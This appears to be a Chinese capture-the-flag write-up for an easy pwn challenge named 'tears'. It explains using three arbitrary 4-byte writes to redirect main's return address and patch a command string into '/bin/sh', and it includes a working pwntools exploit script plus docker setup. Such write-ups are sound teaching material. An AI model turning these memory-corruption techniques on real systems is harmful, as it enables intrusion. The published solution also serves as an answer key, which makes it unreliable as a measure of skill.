#### 1.题目名称

tears

#### 2.题目类型

PWN (easy)

#### 3.题目描述

行车不规范，亲人两行泪。哦不，其实是三行泪。

#### 4.考查知识点

考察任意地址写的利用

#### 5.解题思路

- 题目中提供了三次任意地址写的机会，每次最多可以写4字节。

- 由于关闭了ASLR和PIE，使用一次机会将main函数的返回地址修改为hack函数的地址。

- hack函数虽然只是执行`echo flag`，但是可以发现程序的.text段是有RWX权限的，因此可以利用剩余的两次机会将`echo flag`覆盖为`/bin/sh`，进而拿到shell。当然，覆盖为其他命令也是可以的，只要长度在8字节内均可。

- docker的环境和本地的环境可能存在差别，主要体现在返回地址的位置会不同。但是题目泄露了栈上一个变量的地址，可以通过这个地址计算出docker中返回地址的正确位置。

- 示例EXP如下：

```python
from pwn import *
p = process('./tears')

def send(index, value):
	p.recvuntil('Eye  >')
	p.sendline(hex(index))
	p.recvuntil('Tear >')
	p.sendline(str(value))

def recv():
	p.recvuntil('Your relative:')
	luck = p.recvuntil('\n')
	return luck

luck = int(recv(), 16)
local = 0xffffcfcc
diff = luck - local
send(0xffffcffc + diff, 0x0804883c)   
send(0x080bb888, 0x6e69622f) 
send(0x080bb88c, 0x2068732f) 
p.interactive()
```

#### 6.环境部署

如果需要编译二进制文件，执行：
```bash
make clean & make all
```
Build docker:
```bash
docker build -t "tears" .
```
Run docker:
```bash
docker run -d -p "0.0.0.0:2333:9999" tears
```
程序会在2333端口运行。
